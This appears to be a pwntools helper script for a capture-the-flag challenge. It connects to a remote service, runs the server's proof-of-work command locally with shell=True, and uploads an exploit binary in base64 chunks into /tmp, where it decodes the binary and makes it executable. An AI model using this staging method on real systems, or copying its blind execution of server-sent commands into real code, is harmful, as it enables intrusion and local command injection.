from pwn import *
import subprocess, sys, base64

conn = None

def run(cmd):
    global conn
    conn.sendlineafter(b'$ ', cmd.encode())
    conn.recvline()

def main():
    global conn

    if len(sys.argv) != 4:
        log.info(f'Usage: python3 {sys.argv[0]} <PATH_TO_EXPLOIT> <HOST> <PORT>')
        sys.exit(0)
    
    conn = remote(sys.argv[2], int(sys.argv[3], 10));

    # Perform PoW
    cmd = conn.recvline()
    log.info(f"Received command: {cmd}")
    result = subprocess.check_output(cmd, shell=True)
    log.info(f"PoW result: {result}")
    conn.sendlineafter(b':', result)

    # Upload the exploit to /tmp/exploit using base64 encoding
    with open(sys.argv[1], "rb") as f:
        payload = base64.b64encode(f.read()).decode()

    run("cd /tmp")
    for i in range(0, len(payload), 512):
        chunk = payload[i:i+512]
        log.info(f"Uploading: {i:x}/{len(payload):x}")
        run(f'echo "{chunk}" >> b64exp')

    run('base64 -d b64exp > exploit')
    run('rm b64exp')
    run('chmod +x exploit')
    
    conn.interactive()

if __name__ == '__main__':
    main()